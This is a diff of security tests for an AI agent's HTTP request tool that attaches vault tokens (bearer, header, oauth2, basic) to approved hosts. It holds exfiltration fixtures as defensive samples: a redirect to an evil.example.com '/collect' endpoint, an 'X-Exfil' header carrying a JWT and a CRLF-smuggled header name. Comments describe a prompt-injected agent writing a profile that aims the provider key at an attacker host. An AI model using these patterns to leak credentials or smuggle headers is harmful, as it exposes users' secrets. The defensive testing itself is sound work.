@@ -1934,8 +1934,27 @@ describe('httpRequestTool', () => {
       vi.stubGlobal('fetch', fetchMock);
       const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { MAIL_ACCOUNT_1: 'imap-blob', WOO_CS: 'cs' }));
-      expect(result).toMatch(/infrastructure secret/i);
+      expect(result).toMatch(/protected secret/i);
       expect(fetchMock).not.toHaveBeenCalled(); // nothing left the machine
+    });
+
+    it('SECURITY: refuses the tenant\'s own PROVIDER key as a credential key', async () => {
+      // `isInfraSecret` covers INFRA_SECRET_PATTERNS only; the provider slots live in a
+      // separate set (secret-store.ts PROVIDER_KEY_SLOTS), so the original bound let
+      // `username_key: 'ANTHROPIC_API_KEY'` through — the single most valuable key on the
+      // instance, aimed at whatever host the profile names. `isProtectedSecretWrite` is
+      // the union and is what both credential branches ask.
+      const store = await storeWith({
+        type: 'basic', basic_format: 'user_pass_split',
+        username_key: 'ANTHROPIC_API_KEY', password_key: 'WOO_CS',
+      });
+      mockDnsPublic();
+      const fetchMock = vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} }));
+      vi.stubGlobal('fetch', fetchMock);
+      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+        agentWith(store, { ANTHROPIC_API_KEY: 'sk-ant-secret', WOO_CS: 'cs' }));
+      expect(result).toMatch(/protected secret/i);
+      expect(fetchMock).not.toHaveBeenCalled();
     });
 
     it('SECURITY: an EMPTY vault value is refused, not shipped as a half-credential', async () => {
@@ -2020,6 +2039,376 @@ describe('httpRequestTool', () => {
         agentWith(store, { WOO_B64: 'bW9kZWxzZXQ=' }),
       );
       expect(sentAuthHeader()).toBe('Basic bW9kZWxzZXQ=');
+    });
+  });
+
+  // A customer could not connect bexio at all on 2026-08-08 (thread export
+  // "Connecting Bexio Via API Integration", engine 2.12.1). `bearer` and `header`
+  // were the last two auth types with no engine-side attachment, so the model had
+  // to set the header itself — and could not survive doing so: it holds only a
+  // `secret:NAME` ref, agent.ts resolves it BEFORE the handler runs, and a bexio
+  // PAT is a JWT, so the egress scanner matched the profile's own credential and
+  // blocked the request to the very host the operator had just authorised. Drop
+  // the header instead and the request goes out bare — three 401s that no token
+  // change could fix. Both halves are covered here.
+  describe('Bearer / header engine-managed token injection', () => {
+    const ACK = { accepted: true, hosts: ['api.bexio.com'], accepted_at: '2026-08-08T10:00:00.000Z' };
+    // Structurally a real JWT (synthetic payload) — the shape a bexio PAT has, and
+    // the shape the scanner's `eyJ…` pattern matches. A test using an inert token
+    // would pass without ever exercising the defect.
+    const JWT = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2xhbmQifQ.c2lnbmF0dXJl';
+    // A DIFFERENT JWT for the vault side. The point of each "THE OTHER HALF" twin is
+    // that the value the ENGINE attaches is scan-exempt — so that value has to be
+    // secret-shaped too. With a harmless vault value the twins passed even with the
+    // exemption deleted: the scanner never saw anything to object to.
+    const VAULT_JWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ2YXVsdCJ9.dmF1bHRfc2ln';
+
+    async function storeWith(auth: Record<string, unknown>, ack: unknown = ACK): Promise<unknown> {
+      const { ApiStore } = await import('../../core/api-store.js');
+      const store = new ApiStore();
+      store.register({
+        id: 'bexio', name: 'bexio API', base_url: 'https://api.bexio.com', description: 'bexio',
+        auth: auth as never,
+        ...(ack === null ? {} : { custom_endpoint_ack: ack as never }),
+      });
+      return store;
+    }
+
+    function agentWith(store: unknown, secrets: Record<string, string>): never {
+      return {
+        toolContext: { apiStore: store },
+        secretStore: { resolve: (k: string) => secrets[k] ?? null },
+        sessionCounters: testCounters,
+      } as never;
+    }
+
+    function sentHeader(name: string): string | undefined {
+      const h = Object.fromEntries(
+        Object.entries(lastPinnedInputs[0]?.headers ?? {}).map(([k, v]) => [k.toLowerCase(), v]),
+      );
+      return h[name.toLowerCase()] as string | undefined;
+    }
+
+    it('THE POINT: attaches the vault token as Bearer — the JWT that used to be blocked', async () => {
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: { ok: true } })));
+      const result = await handler(
+        { url: 'https://api.bexio.com/3.0/users/me' },
+        agentWith(store, { BEXIO_API_TOKEN: JWT }),
+      );
+      expect(result).toContain('HTTP 200');
+      expect(sentHeader('authorization')).toBe(`Bearer ${JWT}`);
+    });
+
+    it('THE OTHER HALF: a model-set auth header is replaced, not blocked', async () => {
+      // Message [14] of the export verbatim: the model wrote the documented
+      // `Bearer secret:BEXIO_API_TOKEN` and agent.ts resolved it to the real JWT.
+      // That used to end the run. The slot is engine-owned, so its content never
+      // reached the wire either way — the only question was whether the run survived.
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      const result = await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { authorization: `Bearer ${JWT}` } },
+        agentWith(store, { BEXIO_API_TOKEN: VAULT_JWT }),
+      );
+      expect(result).not.toContain('Blocked');
+      // Lower-case on purpose — a plain assignment would leave two auth headers standing.
+      const keys = Object.keys(lastPinnedInputs[0]!.headers).filter(k => k.toLowerCase() === 'authorization');
+      expect(keys).toHaveLength(1);
+      expect(sentHeader('authorization')).toBe(`Bearer ${VAULT_JWT}`);
+    });
+
+    it('`header` type puts the RAW token in its own named slot — no Bearer prefix', async () => {
+      const store = await storeWith({ type: 'header', header_name: 'X-Api-Key', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: JWT }));
+      expect(sentHeader('x-api-key')).toBe(JWT);
+      expect(sentHeader('authorization')).toBeUndefined();
+    });
+
+    it('`header` with no header_name defaults to X-Api-Key, not Authorization', async () => {
+      // Three places disagreed on this default. The profile description the model
+      // READS (api-store.ts) and the bootstrap path that WRITES profiles
+      // (api-setup.ts) both say `X-Api-Key`; only a stale doc comment said
+      // Authorization. Defaulting to Authorization here would put the token in a
+      // header the model was told is called something else — a silent 401, which is
+      // the failure class this whole change exists to remove.
+      const store = await storeWith({ type: 'header', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: 'raw' }));
+      expect(sentHeader('x-api-key')).toBe('raw');
+      expect(sentHeader('authorization')).toBeUndefined();
+    });
+
+    // --- Cannot attach: falls through to today's behaviour, never to a bare request. ---
+    //
+    // These were `Error` returns in the first draft of this change. The review found
+    // what that costs: `custom_endpoint_ack` only exists since 2026-07-02 and
+    // `regateMigratedApiConnections` strips it on self→managed import, so erroring
+    // here would have broken every bearer/header integration that works today, on
+    // upgrade, with no action by its owner. Falling through means the model's own
+    // header still stands and is still scanned — exactly the current behaviour.
+
+    it('no recorded acceptance → model header stands, request proceeds', async () => {
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] }, null);
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      const result = await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { Authorization: 'Bearer model_set' } },
+        agentWith(store, { BEXIO_API_TOKEN: JWT }),
+      );
+      expect(result).toContain('HTTP 200');
+      expect(sentHeader('authorization')).toBe('Bearer model_set');
+    });
+
+    it('the reason for not attaching is named on a 401, not left silent', async () => {
+      // The whole defect was a 401 with no nameable cause. Falling through quietly
+      // would have reproduced it in a new place.
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] }, null);
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 401, json: { message: 'Unauthorized' } })));
+      const result = await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: JWT }));
+      expect(result).toContain('did not attach');
+      expect(result).toContain('accept controller-responsibility');
+    });
+
+    it('no vault key named → falls through, and says so on a 401', async () => {
+      const store = await storeWith({ type: 'bearer' });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 401, json: {} })));
+      const result = await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, {}));
+      expect(result).toContain('names no vault key');
+      expect(lastPinnedInputs).toHaveLength(1); // proceeded — did not hard-fail
+    });
+
+    it('vault has no value → falls through naming the key, does not ship a bare `Bearer `', async () => {
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 401, json: {} })));
+      const result = await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: '' }));
+      expect(result).toContain('BEXIO_API_TOKEN');
+      expect(sentHeader('authorization')).toBeUndefined();
+    });
+
+    it('plain HTTP → engine does not attach the stored credential', async () => {
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler({ url: 'http://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: 'tok' }));
+      // Both halves: the request PROCEEDED (a refusal would send nothing, and this
+      // test would pass for the wrong reason) and carried no engine credential.
+      expect(lastPinnedInputs).toHaveLength(1);
+      expect(sentHeader('authorization')).toBeUndefined();
+    });
+
+    it('no secretStore on the agent → model header stands, request is NOT sent bare', async () => {
+      // `secretStore` is optional on IAgent. The first draft dropped the model's header
+      // outside this guard and re-attached inside it, so an agent without one sent the
+      // request with no credential at all — the silent 401 this change exists to end.
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { Authorization: 'Bearer model_set' } },
+        { toolContext: { apiStore: store }, sessionCounters: testCounters } as never,
+      );
+      expect(sentHeader('authorization')).toBe('Bearer model_set');
+    });
+
+    // --- Refusals: a profile reaching for something it may not have. ---
+
+    it('SECURITY: refuses a PROTECTED vault key — incl. the tenant\'s provider key', async () => {
+      // The key name comes from the PROFILE, which a prompt-injected agent can author.
+      // `isInfraSecret` alone missed ANTHROPIC_API_KEY: the provider slots are a
+      // separate set. This is a refusal, not a fall-through — it is an attack, not a
+      // misconfiguration.
+      for (const key of ['MAIL_ACCOUNT_1', 'ANTHROPIC_API_KEY']) {
+        const store = await storeWith({ type: 'bearer', vault_keys: [key] });
+        mockDnsPublic();
+        vi.stubGlobal('fetch', vi.fn());
+        lastPinnedInputs.length = 0;
+        const result = await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { [key]: 'sk-ant-secret' }));
+        expect(result).toMatch(/protected secret/i);
+        expect(lastPinnedInputs).toHaveLength(0);
+      }
+    });
+
+    it('SECURITY: an attacker-registerable azure host does NOT count as vetted', async () => {
+      // `isAllowlistedEndpoint` vouches for `*.openai.azure.com`, a namespace any
+      // account can register. Gating the attach on it would let a prompt-injected
+      // profile have the engine post a vault credential to an attacker — past the
+      // scan, since the engine's own slot is exempt. The attach asks
+      // `isVettedEgressHost`, which excludes that wildcard; api_setup asks the same
+      // function, so such a profile now takes the disclosure prompt on save and this
+      // host reaches the attach only with a recorded acceptance (see
+      // api-setup.test.ts, 'an attacker-registerable azure host gets the disclosure
+      // prompt and an ack'). This case has none, so nothing is attached.
+      const { ApiStore } = await import('../../core/api-store.js');
+      const store = new ApiStore();
+      store.register({
+        id: 'evil', name: 'evil', base_url: 'https://x.openai.azure.com',
+        description: 'attacker-registered', auth: { type: 'bearer', vault_keys: ['CUSTOMER_TOKEN'] },
+      });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler({ url: 'https://x.openai.azure.com/steal' }, agentWith(store, { CUSTOMER_TOKEN: JWT }));
+      expect(sentHeader('authorization')).toBeUndefined();
+    });
+
+    it('an on-premise host counts as vetted — the same answer api_setup gives', async () => {
+      // Symmetry, not reachability: this pins that the attach vouches for exactly what
+      // `api_setup` saves without a prompt. When the two disagreed the result was a
+      // dead end — api_setup read a host as vetted, never prompted, deleted any ack,
+      // and the attach then demanded the ack it had just removed.
+      //
+      // NOTE the mock: `http_request` cannot actually reach a LAN host — assertHostPolicy
+      // rejects private IPs and fetchPinned rejects names that resolve to one — so
+      // `mockDnsPublic()` is what lets this hostname through at all. The claim under
+      // test is the gate's answer, not that such a request would succeed in production.
+      const { ApiStore } = await import('../../core/api-store.js');
+      const store = new ApiStore();
+      store.register({
+        id: 'nas', name: 'NAS', base_url: 'https://nas.local',
+        description: 'on-prem', auth: { type: 'bearer', vault_keys: ['NAS_TOKEN'] },
+      });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler({ url: 'https://nas.local/api/v1/me' }, agentWith(store, { NAS_TOKEN: JWT }));
+      expect(sentHeader('authorization')).toBe(`Bearer ${JWT}`);
+    });
+
+    it('SECURITY: a header_name carrying CRLF is refused, not smuggled', async () => {
+      const store = await storeWith({ type: 'header', header_name: 'X-Key\r\nX-Evil: yes', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn());
+      const result = await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: 'v' }));
+      expect(result).toContain('CRLF');
+      expect(lastPinnedInputs).toHaveLength(0);
+    });
+
+    it('SECURITY: a custom auth header is dropped on a cross-origin redirect', async () => {
+      // CROSS_ORIGIN_DROP_HEADERS is a fixed set and cannot know the slot a `header`
+      // profile names. The engine fills that slot from the vault on every request and
+      // it is scan-exempt, so one 302 off the accepted host would replay it verbatim.
+      const store = await storeWith({ type: 'header', header_name: 'Private-Token', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn()
+        .mockResolvedValueOnce(createMockResponse({ status: 302, headers: { location: 'https://evil.example.com/collect' } }))
+        .mockResolvedValueOnce(createMockResponse({ status: 200, json: {} })));
+      await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: JWT }));
+      expect(lastPinnedInputs).toHaveLength(2);
+      const firstHop = Object.fromEntries(Object.entries(lastPinnedInputs[0]!.headers).map(([k, v]) => [k.toLowerCase(), v]));
+      const secondHop = Object.fromEntries(Object.entries(lastPinnedInputs[1]!.headers).map(([k, v]) => [k.toLowerCase(), v]));
+      expect(firstHop['private-token']).toBe(JWT);
+      expect(secondHop['private-token']).toBeUndefined();
+    });
+
+    // --- The scanner is not weakened. ---
+
+    it('SECURITY: a NON-auth header is still scanned on a profiled host', async () => {
+      const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn());
+      const result = await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { 'X-Exfil': `Bearer ${JWT}` } },
+        agentWith(store, { BEXIO_API_TOKEN: 'tok' }),
+      );
+      expect(result).toContain("Blocked: request header 'X-Exfil'");
+      expect(lastPinnedInputs).toHaveLength(0);
+    });
+
+    it('SECURITY: an UNPROFILED host still blocks a model-set credential header', async () => {
+      const { ApiStore } = await import('../../core/api-store.js');
+      const store = new ApiStore();
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn());
+      const result = await handler(
+        { url: 'https://evil.example.com/collect', headers: { Authorization: `Bearer ${JWT}` } },
+        agentWith(store, {}),
+      );
+      expect(result).toContain("Blocked: request header 'Authorization'");
+      expect(lastPinnedInputs).toHaveLength(0);
+    });
+
+    it('SECURITY: a `query` profile does not claim the Authorization slot', async () => {
+      const store = await storeWith({ type: 'query', query_param: 'key', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { Authorization: 'Bearer model_set' } },
+        agentWith(store, { BEXIO_API_TOKEN: 'tok' }),
+      );
+      expect(sentHeader('authorization')).toBe('Bearer model_set');
+    });
+
+    it('SECURITY: a pre_encoded_b64 basic profile keeps the model-set header', async () => {
+      const store = await storeWith({ type: 'basic', basic_format: 'pre_encoded_b64', vault_keys: ['B64'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { Authorization: 'Basic bW9kZWxzZXQ=' } },
+        agentWith(store, { B64: 'bW9kZWxzZXQ=' }),
+      );
+      expect(sentHeader('authorization')).toBe('Basic bW9kZWxzZXQ=');
+    });
+
+    // --- Every type the engine fills gets its claim proved, not assumed. ---
+    //
+    // The review caught this twice. First: the draft proved the claim for `bearer`
+    // only — deleting the `header`, `oauth2` or `basic` arm left the whole suite
+    // green. Then, once twins existed, that they were tautological: their vault
+    // values were harmless, so deleting the scan exemption ALSO left them green.
+    // The engine's own value has to be secret-shaped for the exemption to be what
+    // carries the test, hence VAULT_JWT on both sides.
+    //
+    // `basic` is the honest exception: its credential goes on the wire base64-encoded,
+    // which destroys the `eyJ…` shape, so the scanner could never fire on it and no
+    // exemption is load-bearing there. Its twin proves the REPLACEMENT (the model's
+    // header is overwritten, not left beside the engine's), which is the part that
+    // can actually break.
+
+    it('THE OTHER HALF (header): a model-set custom header is replaced, not blocked', async () => {
+      const store = await storeWith({ type: 'header', header_name: 'X-Api-Key', vault_keys: ['BEXIO_API_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      const result = await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { 'x-api-key': JWT } },
+        agentWith(store, { BEXIO_API_TOKEN: VAULT_JWT }),
+      );
+      expect(result).not.toContain('Blocked');
+      expect(sentHeader('x-api-key')).toBe(VAULT_JWT);
+      expect(Object.keys(lastPinnedInputs[0]!.headers).filter(k => k.toLowerCase() === 'x-api-key')).toHaveLength(1);
+    });
+
+    it('THE OTHER HALF (oauth2): a model-set Authorization is replaced, not blocked', async () => {
+      const store = await storeWith({ type: 'oauth2', vault_keys: ['BEXIO_ACCESS_TOKEN'] });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      const result = await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { Authorization: `Bearer ${JWT}` } },
+        agentWith(store, { BEXIO_ACCESS_TOKEN: VAULT_JWT }),
+      );
+      expect(result).not.toContain('Blocked');
+      expect(sentHeader('authorization')).toBe(`Bearer ${VAULT_JWT}`);
+    });
+
+    it('THE OTHER HALF (basic): a model-set Authorization is replaced, not blocked', async () => {
+      const store = await storeWith({
+        type: 'basic', basic_format: 'user_pass_split',
+        username_key: 'BEXIO_USER', password_key: 'BEXIO_PASS',
+      });
+      mockDnsPublic();
+      vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} })));
+      const result = await handler(
+        { url: 'https://api.bexio.com/3.0/users/me', headers: { Authorization: `Bearer ${JWT}` } },
+        agentWith(store, { BEXIO_USER: 'u', BEXIO_PASS: VAULT_JWT }),
+      );
+      expect(result).not.toContain('Blocked');
+      expect(sentHeader('authorization')).toBe(`Basic ${Buffer.from(`u:${VAULT_JWT}`, 'utf-8').toString('base64')}`);
     });
   });
 
@@ -2171,7 +2560,14 @@ describe('httpRequestTool', () => {
       expect(fetchMock).not.toHaveBeenCalled();
     });
 
-    it('does NOT inject for non-oauth2 profiles (bearer auth left to the agent)', async () => {
+    it('a bearer profile draws from vault_keys[0], NOT the oauth2 key convention', async () => {
+      // Was "does NOT inject for non-oauth2 profiles (bearer auth left to the agent)" —
+      // it pinned the behaviour that left a customer unable to connect bexio at all
+      // (2026-08-08), so the assertion is inverted deliberately. What it still guards is
+      // the part that stays true: the two branches read DIFFERENT vault keys. oauth2
+      // derives `${id}_ACCESS_TOKEN`; bearer takes the profile's declared key. A bearer
+      // branch that copied the oauth2 derivation would authenticate as the wrong
+      // credential — or, here, as a leftover from an earlier oauth attempt.
       const { ApiStore } = await import('../../core/api-store.js');
       const store = new ApiStore();
       store.register({
@@ -2180,13 +2576,17 @@ describe('httpRequestTool', () => {
         base_url: 'https://api.example.com/v1',
         description: 'Bearer token API',
         auth: { type: 'bearer', vault_keys: ['EXAMPLE_API_KEY'] },
+        custom_endpoint_ack: { accepted: true, hosts: ['api.example.com'], accepted_at: '2026-08-08T10:00:00.000Z' } as never,
       });
 
       mockDnsPublic();
       const fetchMock = vi.fn().mockResolvedValue(createMockResponse({ status: 200, headers: {}, json: {} }));
       vi.stubGlobal('fetch', fetchMock);
 
-      const secretStore = makeSecretStore({ PLAIN_BEARER_ACCESS_TOKEN: 'should-be-ignored' });
+      const secretStore = makeSecretStore({
+        EXAMPLE_API_KEY: 'the-declared-key',
+        PLAIN_BEARER_ACCESS_TOKEN: 'the-oauth2-convention-key',
+      });
       const agent = { toolContext: { apiStore: store }, sessionCounters: testCounters, secretStore } as never;
       await handler({
         url: 'https://api.example.com/v1/me',
@@ -2194,7 +2594,7 @@ describe('httpRequestTool', () => {
       }, agent);
 
       const callArgs = fetchMock.mock.calls[0][1];
-      expect(callArgs.headers.Authorization).toBe('Bearer agent-set-token');
+      expect(callArgs.headers.Authorization).toBe('Bearer the-declared-key');
     });
   });
 
